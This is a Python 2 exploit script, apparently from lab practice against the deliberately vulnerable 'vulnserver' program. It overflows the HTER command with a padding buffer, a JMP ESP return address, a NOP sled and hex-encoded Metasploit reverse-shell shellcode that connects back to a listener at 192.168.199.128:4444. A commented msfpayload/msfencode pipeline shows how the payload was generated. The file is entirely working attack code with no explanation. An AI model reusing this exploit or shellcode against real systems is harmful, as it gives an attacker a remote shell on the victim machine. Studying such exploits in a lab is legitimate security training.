import socket
import struct
import time
import binascii

print "\nExploitation of HTER Command - Exploit (Reverse Shell)\n"

ip_addr = '192.168.199.130'
port = 9999

# send evil buffer to vulnserver
def send_evil_buffer(evil_buffer):

    did_send = False

    command = evil_buffer[:5]

    print "Sending buffer of length %s to command %s" % (len(evil_buffer), command)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip_addr, int(port)))

    except Exception as e:
        print "[-] Failed to connect to service %s" % e

    else:
        print "[+] Connected to server"

        # Get banner response
        data = s.recv(1024)
        print(data)

        bytes_sent = s.send(evil_buffer)
        print "Sent %s bytes" % bytes_sent

        if bytes_sent > 0:
            did_send = True

    finally:
        s.close()
 
    return did_send

###############################################################################

# JMP ESP
#625011AF   FFE4             JMP ESP
jmp_esp = binascii.hexlify(struct.pack("<I", 0x625011AF))

# nop sled
nop_sled = '90'*100

# Reverse Shell
# msfpayload windows/shell_reverse_tcp LHOST=192.168.199.128 LPORT=4444 EXITFUN=NONE R | msfencode -b '\x00' -t raw > rshell.bin
# hexdump -C rshell.bin | grep -v 00000155 | cut -d" " -f 3-19 | sed -e 's/ //g' | tr -d '\n'
shellcode = "bac1c97739d9cbd97424f45e2bc9b14f31561483eefc035610233c8bd12abf74224c4991135e2dd1066e25b7aa056b2c386ba44389c1926a0ae41a20c867e73b1d47d6f350861fe99bdac86509ca7d3b92eb5137aa93d4885f29d6d8f02690c07b6001f0a8737dbbc547f53a0c96f60c7074c9a07d850d069ef065742302be06ff8723a0743f805058d9435e15ae0c43a863277f2182e80971a02c5121c9753f84f666e77952ec0a6de4af4242da4f93cc6d23a153c5ab891cc32ced36b3a310b9c3ead6ed9384ff8d7855ff5b2e05af338ef50fe4661c80db961f4a6a9188b5c5dac95e14e4d8c29102b0eaf79d2d925d55cf5b48fd6cc917fdfbf28faaacc5d93e417f705c9819bbe447da42e50a6661f5d2672da18a31fb1f6de84dc92747049dbeab97dbbee161030e5c343cbf08b045dda83f9c65d875bccc71d0554d1ce380921960206bde78416e9a3eba02b3aabcb1b4fe" 

evil_buffer = "HTER " + 'A'*2041 + jmp_esp + nop_sled + shellcode 

print "Evil buffer:\n %s" % evil_buffer

send_evil_buffer(evil_buffer)
